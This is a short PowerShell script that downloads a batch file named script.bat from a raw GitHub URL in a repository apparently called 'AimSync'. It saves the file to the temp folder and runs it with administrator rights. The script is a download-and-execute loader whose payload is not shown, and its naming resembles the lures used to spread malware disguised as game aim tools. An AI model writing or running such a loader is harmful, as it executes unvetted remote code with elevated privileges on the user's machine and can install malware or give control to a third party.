$batUrl = "https://raw.githubusercontent.com/AdrianFawkes/AimSync/refs/heads/main/script.bat"
$batPath = "$env:TEMP\script.bat"

Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing
Start-Process $batPath -Verb RunAs
